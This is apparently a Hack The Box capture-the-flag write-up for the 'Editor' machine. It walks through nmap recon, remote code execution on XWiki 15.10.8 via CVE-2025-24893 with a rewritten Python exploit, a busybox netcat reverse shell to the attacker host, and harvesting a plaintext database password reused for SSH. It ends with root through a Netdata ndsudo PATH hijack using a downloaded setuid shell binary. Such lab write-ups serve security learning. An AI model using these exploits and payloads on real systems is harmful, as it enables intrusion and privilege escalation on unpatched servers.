# Editor

## Recon

::: details nmap_scan.log
```log
Open 10.10.11.80:22
Open 10.10.11.80:80
Open 10.10.11.80:8080
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.10.11.80

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp   open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http    syn-ack Jetty 10.0.20
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/
| http-methods: 
|   Supported Methods: OPTIONS GET HEAD PROPFIND LOCK UNLOCK
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-robots.txt: 50 disallowed entries (40 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
| /xwiki/bin/undelete/ /xwiki/bin/reset/ /xwiki/bin/register/ 
| /xwiki/bin/propupdate/ /xwiki/bin/propadd/ /xwiki/bin/propdisable/ 
| /xwiki/bin/propenable/ /xwiki/bin/propdelete/ /xwiki/bin/objectadd/ 
| /xwiki/bin/commentadd/ /xwiki/bin/commentsave/ /xwiki/bin/objectsync/ 
| /xwiki/bin/objectremove/ /xwiki/bin/attach/ /xwiki/bin/upload/ 
| /xwiki/bin/temp/ /xwiki/bin/downloadrev/ /xwiki/bin/dot/ 
| /xwiki/bin/delattachment/ /xwiki/bin/skin/ /xwiki/bin/jsx/ /xwiki/bin/ssx/ 
| /xwiki/bin/login/ /xwiki/bin/loginsubmit/ /xwiki/bin/loginerror/ 
|_/xwiki/bin/logout/
|_http-server-header: Jetty(10.0.20)
|_http-open-proxy: Proxy might be redirecting requests
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| http-webdav-scan: 
|   Server Type: Jetty(10.0.20)
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP (80)

We can get SimplistCode Pro editor using download page

![Writeup.png](/assets/pentest/htb/editor/Writeup.png)

Docs redirects to [http://wiki.editor.htb/xwiki/bin/view/Main/](http://wiki.editor.htb/xwiki/bin/view/Main/) which seems to be the same as [http://editor.htb:8080/xwiki/bin/view/Main/](http://editor.htb:8080/xwiki/bin/view/Main/) (Port 8080)

### XWiki

Version: `XWiki Debian 15.10.8`

![Writeup-1.png](/assets/pentest/htb/editor/Writeup-1.png)

[XWiki Platform allows remote code execution as guest via SolrSearchMacros request](https://github.com/advisories/GHSA-rr6p-3pfg-562j)

![Writeup-2.png](/assets/pentest/htb/editor/Writeup-2.png)

### RCE

POC: [CVE-2025-24893.py](https://github.com/a1baradi/Exploit/blob/main/CVE-2025-24893.py)

Something didn't work for me, so I rewrote it
```python
import html
from requests import Session
from bs4 import BeautifulSoup as BS
from argparse import ArgumentParser

PAYLOAD = r'}}}{{async async=false}}{{groovy}}println("%s".execute().text){{/groovy}}1{{/async}}'

def execute(session, url, command):
    resp = session.get(f'{url}/bin/get/Main/SolrSearch', params={'media': 'rss', 'text': PAYLOAD % command})
    print(resp.url)
    html_data = BS(html.unescape(resp.text.replace('<br/>', '\n')), 'html.parser')
    output = html_data.find('description').text.strip()[27:]
    return output

parser = ArgumentParser()
parser.add_argument('-u', '--url', required=True, type=str, help='Base URL of the target wiki')
parser.add_argument('-c', '--command', required=False, type=str, help='Command to execute')
args = parser.parse_args()

with Session() as session:
    if args.command:
        cmd = args.command
        output = execute(session, args.url, cmd)
        print(output)
    else:
        while True:
            cmd = input("Command: ").strip()
            if cmd.lower() == 'exit': break
            output = execute(session, args.url, cmd)
            print(output)
```

#### Reverse Shell

```bash
└─$ py CVE-2025-24893.py -u http://wiki.editor.htb/xwiki -c 'busybox nc 10.10.14.35 4444 -e /bin/bash'
http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync+async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22busybox+nc+10.10.14.35+4444+-e+%2Fbin%2Fbash%22.execute%28%29.text%29%7B%7B%2Fgroovy%7D%7D1%7B%7B%2Fasync%7D%7D
1]
```

I was looking for any credentials to priv esc, but with no luck. Config files don't have credentials and database is MySQL.
```bash
(remote) xwiki@editor:/usr/lib/xwiki-jetty$ id
uid=997(xwiki) gid=997(xwiki) groups=997(xwiki)
(remote) xwiki@editor:/var/lib/xwiki/data$ ss -tunlp4
Netid    State     Recv-Q    Send-Q         Local Address:Port          Peer Address:Port    Process
udp      UNCONN    0         0                  127.0.0.1:8125               0.0.0.0:*
udp      UNCONN    0         0              127.0.0.53%lo:53                 0.0.0.0:*
tcp      LISTEN    0         70                 127.0.0.1:33060              0.0.0.0:*
tcp      LISTEN    0         151                127.0.0.1:3306               0.0.0.0:*
tcp      LISTEN    0         511                  0.0.0.0:80                 0.0.0.0:*
tcp      LISTEN    0         128                  0.0.0.0:22                 0.0.0.0:*
tcp      LISTEN    0         4096               127.0.0.1:36201              0.0.0.0:*
tcp      LISTEN    0         4096               127.0.0.1:19999              0.0.0.0:*
tcp      LISTEN    0         4096           127.0.0.53%lo:53                 0.0.0.0:*
tcp      LISTEN    0         4096               127.0.0.1:8125               0.0.0.0:*
tcp      LISTEN    2         1                    0.0.0.0:9001               0.0.0.0:*        users:(("python3",pid=2999,fd=3))
```

There are some kind of keys, but I don't think it's very helpful.
```bash
(remote) xwiki@editor:/var/lib/xwiki/data$ cat configuration.properties
xwiki.authentication.validationKey = \uBF48\u0EE2\u03FE\u4B0F\u3C8E\u35DA\uEEB8\u4013\u1E90\uF9A7\u4040\u28EA\uD217\u288BF\u6AF7\u377E\u295C\uC98D\u17FB5\uD3D4\u967F\uB8DE\u955B\uD54B\uEE55\u890D\uAFFC\u993B\u1C49\u9B87
xwiki.authentication.encryptionKey = \uC327\u7B18\u1FFE\u913D\uEDBD\u6C85\uE778\uD7C6\u91D0\uA56F\uE1CB\u014B\uD03E\u9E5D\uED9D\uB44A\u3A0C\u1C76\uF0D6\u8289\u645F\u6EB8\u00EB\u99DA\u589E\uE3CE\uC24A\u9486\u5EAB\u2E85\uCCEB\uAF4D
```

There's more config files in `/etc/xwiki`
```bash
(remote) xwiki@editor:/etc/xwiki$ grep password . -Rin --color=auto 2>/dev/null
./hibernate.cfg.xml:104:    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
...
./hibernate.cfg.xml.ucf-dist:104:    <property name="hibernate.connection.password">xwikipassword2025</property>
...
./xwiki.cfg:301:# xwiki.superadminpassword=system
```

## SSH

```bash
└─$ sshpass -p 'theEd1t0rTeam99' ssh editor.htb -l oliver
oliver@editor:~$ id
uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
```

### User.txt

```
oliver@editor:~$ cat user.txt
94c0cb45391e7163b8b6932fc0ed0aa1
```

## Privilege Escalation

### Netdata

Checking the ports above, only 19999 is accessible.
```bash
(remote) xwiki@editor:/var/lib/xwiki/data$ curl 0:19999 -s | grep '<title>'
<!doctype html><html><head><title>Netdata Agent Console</title><script>let pathsRegex = /\/(spaces|nodes|overview|alerts|dashboards|anomalies|events|cloud|v2)\/?.*/
```

```bash
(remote) xwiki@editor:/opt/netdata$ ./bin/netdata -v
netdata v1.45.2
```

Port forward application with SSH
```bash
└─$ sshpass -p 'theEd1t0rTeam99' ssh editor.htb -l oliver -L 80:0:19999
```

![Writeup-3.png](/assets/pentest/htb/editor/Writeup-3.png)

### SUID Path Hijack

- [https://cvefeed.io/vuln/product/3381/netdatanetdata](https://cvefeed.io/vuln/product/3381/netdatanetdata)
- [https://cvefeed.io/vuln/detail/CVE-2024-32019](https://cvefeed.io/vuln/detail/CVE-2024-32019)
- [https://github.com/juanbelin/CVE-2024-32019-POC](https://github.com/juanbelin/CVE-2024-32019-POC)

File not in PATH
```bash
oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo arcconf-ld-info
arcconf : not available in PATH.
```

Create malicious binary from POC, I compiled as static because victim doesn't have `gcc`
```bash
└─$ echo $'#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main() {\nsetuid(0);\nsetgid(0);\nexecl("/bin/bash", "bash", "-p", NULL);\nperror("execl");\nreturn 1;}' | gcc -x c -static -o arcconf -
```

```bash
oliver@editor:~$ curl 10.10.14.35/arcconf -o /tmp/arcconf
oliver@editor:~$ chmod +x /tmp/arcconf
oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo arcconf-ld-info
root@editor:/home/oliver# id
uid=0(root) gid=0(root) groups=0(root),999(netdata),1000(oliver)
```

### Root.txt

```
root@editor:/home/oliver# cat /root/root.txt
932702ddbf7b24de57d7abac96938756
```

